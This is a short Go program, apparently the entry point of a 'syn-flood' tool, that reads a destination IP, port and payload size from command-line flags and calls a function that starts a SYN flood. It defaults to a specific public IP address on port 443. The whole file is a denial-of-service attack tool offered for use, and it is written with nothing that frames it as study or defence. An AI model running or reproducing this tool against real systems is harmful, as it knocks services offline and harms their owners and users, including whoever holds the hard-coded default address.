package main

import (
	"github.com/bilalcaliskan/syn-flood/pkg/raw"
	_ "github.com/dimiro1/banner/autoload"
	flag "github.com/spf13/pflag"
)

var (
	dstIpStr               string
	dstPort, payloadLength int
)

func init() {
	flag.StringVar(&dstIpStr, "dstIpStr", "213.238.175.187", "Provide public ip of the destination")
	flag.IntVar(&dstPort, "dstPort", 443, "Provide reachable port of the destination")
	flag.IntVar(&payloadLength, "payloadLength", 1400, "Provide payload length in bytes for each SYN packet")
	flag.Parse()
}

func main() {
	raw.StartFlooding(dstIpStr, dstPort, payloadLength)
}
